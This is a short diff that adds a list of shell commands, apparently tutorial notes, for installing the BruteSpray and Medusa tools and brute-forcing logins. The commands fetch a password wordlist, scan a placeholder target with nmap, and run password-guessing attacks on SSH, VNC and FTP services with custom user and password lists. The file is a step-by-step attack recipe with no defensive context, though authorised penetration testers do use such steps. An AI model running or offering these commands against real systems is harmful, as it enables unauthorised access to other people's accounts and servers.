@@ -1,0 +1,18 @@
+apt-get autoremove brutespray
+git clone https://github.com/x90skysn3k/brutespray.git
+cd brutespray/
+pip install -r requirements.txt
+apt-get install medusa
+./brutespray.py --help
+apt-get install nmap
+wget 'https://raw.githubusercontent.com/tokyoneon/1wordlist/master/1wordlist2rulethem%40ll.txt'
+
+nmap -sVTU -p ports TargetServer -oG filename.gnmap
+cat filename.gnmap
+./brutespray.py --modules
+./brutespray.py --file filename.gnmap -i
+./brutespray.py --file filename.gnmap --service ssh
+cp /path/to/customPasswords.list wordlist/ssh/password
+cp /path/to/customUser.list wordlist/vnc/user
+
+./brutespray.py --file filename.gnmap --username UsernameHere --passlist /path/to/desired/passwords.list --service ftp
